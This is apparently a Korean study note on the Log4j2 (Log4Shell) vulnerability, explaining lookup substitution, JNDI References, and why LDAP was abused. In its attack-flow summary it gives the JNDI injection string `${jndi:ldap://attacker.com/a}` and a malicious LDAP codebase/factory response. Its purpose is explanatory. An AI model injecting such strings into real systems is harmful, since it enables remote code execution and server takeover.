# 01_Log4j 보안 취약점

> Apache Log4j2의 보안 취약점

<br>

## 1. 원리

해당 보안 취약점의 핵심은 Log4j가 로그 메시지 안의 `${...}`문자열을 **치환 대상으로 해석해서 실행**한다는 점에 있다.

### 1) Lookup 기능

Log4j2는 로그 메시지에서 `${env:JAVA_HOME}`, `${date:yyyy-MM-dd}`와 같은 표현이 있으면 값을 치환해서 출력한다.

보통 이러한 바인딩은 설정 파일의 값을 읽어오기 위한 용도로 사용되지만 문제는 로그로 찍히는 메시지 자체에도 적용되었다는 점이다.

### 2) 공격 루트

이러한 기능 중 JNDI Lookup을 활용한 악용이 가능했는데 `${jndi:ldap://공격자서버/xxx}`와 같은 로깅 공격을 통해 Log4j가 이 로그를 만나면, 이를 해석하여 LDAP(또는 RMI 등)을 통해 서버에 실제 접속할 수 있게 된다.

Log4j가 LDAP으로 공격자 서버를 호출하면 공격자 서버에서 악성 Java 객체 참조를 응답하여, 피해자 서버에서 그 클래스를 내려받게되고 이를 로드하여 실행하게 된다. RCE를 통해 서버 장악이 가능해지는 셈이다.

- 요약

```
1. 공격자가 HTTP 헤더/파라미터 등에 ${jndi:ldap://...} 삽입
2. 애플리케이션이 그 값을 로그로 기록.
3. 로그 문자열 ${jndi:ldap://attacker.com/a}가 JNDI lookup으로 전달됨
4. Log4j가 문자열을 lookup으로 해석, 피해 서버(클라이언트 역할)가 attacker.com의 LDAP 서버(공격자 서버)에 접속
5. 공격자 LDAP 서버가 "javaCodeBase=http://attacker.com/, javaFactory=Evil" 같은 엔트리를 응답
6. 피해 서버의 JNDI가 그 정식 기능에 따라 codebase URL에서 클래스 파일을 다운로드 (악성 클래스 수신 및 실행 → RCE)
7. 클래스를 로드하고 인스턴스화 → 클래스의 static 블록/생성자 코드가 실행됨
```

### 3) 왜 위험했나

- 너무나도 쉬운 공격: 로그를 통한 공격이기 때문에 로그에 찍히는 값이면 어디든 진입점이 된다. 심지어 인증도 필요없다. (로그에 남기기만 하면 됨)
- 방대한 영향 범위: Log4j가 거의 모든 Java 생태계에 사용되었기 때문에 ElasticSearch, Kafka, Solr와 같은 인프라 솔루션 및 직접 쓰지 않아도 간접적으로 의존성이 딸려온 경우가 있어 많은 시스템에 영향을 주었음.
- 치명적인 결과: 로그를 통해 침투하여 임의적인 코드 실행이 가능했기 때문에 단순 정보 탈취부터 시작해서, 랜섬웨어 공격, 코인 마이너 설치 등 모든 악의적인 공격이 가능했음.

<br>

## 2. JNDI와 LDAP

Log4j에서 JNDI는 문(door)이었고, LDAP은 문으로 통하는 통로 중 하나였다.

### 1) JNDI

> Java Naming and Directory Interface

이름으로 자원(파일, 디렉토리 등)을 찾아주는 Java 표준 API.

코드에 DB 주소나 객체의 위치를 하드코딩하지 않고, 이름을 통해서 조회해온 다음 가져오게 해준다.

JNDI는 Naming과 Directory 서비스 두 가지를 하나의 API로 묶은 것이다.

#### (1) 배경

어플리케이션이 외부 자원을 사용할 때, 이러한 자원에 대한 접속 정보를 코드에 하드코딩 해두면 환경마다 코드를 고쳐야 한다.

문제는 코드를 고치게되면 재배포를 위해 빌드까지 다시 해야하는 번거로움이 생긴다.

JNDI는 "**자원을 이름으로 요청하고, 그 이름이 실제 무엇을 가르키는지는 실행 환경(WAS 등)이 결정한다**"는 관점을 가지고 있다.

즉 코드는 그대로 두고, 설정을 이름으로만 불러오고 설정만 다르게 가져가는 형태로 사용하는 것이다.

```xml
<!-- context.xml: 서버 쪽에서 실제 자원을 정의 -->
<Resource name="jdbc/appDB" auth="Container"
          type="javax.sql.DataSource"
          driverClassName="org.postgresql.Driver"
          url="jdbc:postgresql://db:5432/app"
          username="app" password="..."
          maxTotal="20"/>
```

```java
DataSource ds = (DataSource) new InitialContext().lookup("java:comp/env/jdbc/appDB"); // 코드: 이름만 안다 (JNDI api 호출)
```

#### (2) SPI

JNDI는 API로서 기본 제공되는 부분도 있지만 SPI로서 Provider가 직접 인터페이스를 구현하여 사용하는 것도 가능하다.

- api: 개발자 (내 코드) → 외부 라이브러리 (API) 호출
- spi: 프레임워크 → provider 구현체를 호출

#### (3) 네임스페이스

JavaEE/Tomcat에서 JNDI를 쓰면 `java:comp/env/jdbc/appDB` 같은 이름을 볼 수 있다.

| 네임스페이스    | 범위                         |
| --------------- | ---------------------------- |
| `java:comp`     | 현재 컴포넌트(웹 앱 등) 전용 |
| `java:comp/env` | 컴포넌트의 환경 영역         |
| `java:module`   | 모듈 범위                    |
| `java:app`      | 어플리케이션(EAR) 범위       |
| `java:global`   | 서버 전체 공유               |

#### (4) 원리 (객체 저장/복원)

JNDI에서 객체를 다루는 방식으로 크게 3가지가 있다. (Context에 `bind(name, obj)`할 때, 그리고 `lookup`으로 꺼낼 때 객체를 다루는 방식)

- 직접 저장: 객체 자체를 그대로 반환하여 저장.
- 직렬화: 직렬화된 바이트를 저장했다가 역직렬화해서 복원한다. (예- LDAP의 javaSerializedData)
- 참조: 만드는 방법 정보(Reference)를 저장했다가 Factory를 통해 객체를 생성한다.

```
lookup("이름")
 → provider가 저장소에서 Reference를 받아옴
 → NamingManager.getObjectInstance(reference, ...)
     1. reference의 factoryClassName을 읽는다
     2. 그 클래스를 로드한다
        (로컬 클래스패스에 없으면 factoryClassLocation에서 원격 다운로드)
     3. ObjectFactory.getObjectInstance(...) 호출
     4. Factory가 만든 객체를 반환
```

```java
Reference ref = new Reference(
    "javax.sql.DataSource",        // className: 결과 객체의 타입
    "com.example.DsFactory",       // factoryClassName: 객체를 만들어줄 Factory
    "http://host/classes/"         // factoryClassLocation: Factory 클래스를 받을 codebase (선택)
);
ref.add(new StringRefAddr("url", "jdbc:postgresql://..."));  // Factory에 넘길 재료
```

#### (5) 요약

```
애플리케이션
   │  lookup("이름")                     ← javax.naming (API)
   ▼
InitialContext  (위임 래퍼)
   │  ① URL 스킴 있으면 → URLContextFactory 탐색
   │  ② 없으면 → java.naming.factory.initial 의 InitialContextFactory
   ▼
provider의 Context 구현체               ← javax.naming.spi (SPI)로 규격화
   │  (LDAP / RMI / DNS / Tomcat 내부 ...)
   ▼
저장소에서 결과 수신 (객체 / 직렬화 바이트 / Reference)
   │
   ▼
NamingManager.getObjectInstance()
   │  Reference면 → factoryClassName 로드 → ObjectFactory가 객체 생성
   ▼
애플리케이션에 객체 반환
```

<br>

### 2) LDAP

> Lightweight Directory Access Protocol

디렉토리 서비스에 접근하기 위한 네트워크 프로토콜. 여기서 말하는 디렉토리는 "계층 구조로 저장된 조회 중심의 데이터베이스"로 볼 수 있다.

주로 조직도, 사용자 계정, 권한 정보를 저장하고 있어서, 외부 시스템과의 계정 연동/SSO에서 흔히 사용된다.

데이터는 다음과 같이 트리 구조이다.

```
dc=company,dc=com
 └─ ou=dev
     └─ cn=siwon  (uid, mail, 소속 등 속성)
```

쓰기보다는 읽기/검색에 최적화되어 있어 해당 용도로 압도적으로 많이 사용된다. 기본 포트는 389 (보안: 636)이다.

<br>

### 3) 왜 LDAP이었나

LDAP의 경우 객체 반환 스키마가 표준으로 존재하며 방화벽에서 상대적으로 덜 차단될 가능성이 있어서 악용되었음

- Java 객체를 응답할 수 있는 기능
  - javaCodeBase, javaFactory, javaSerializedData가 표준으로 있어 응답에 Java 객체 정보를 실을 수 있음
- 보통 방화벽에서 덜 막힘
  - 기업환경에서 LDAP은 사내 계정 연동용으로 많이 사용되기 때문에 정상적인 트래픽으로 인식하는 경우가 많음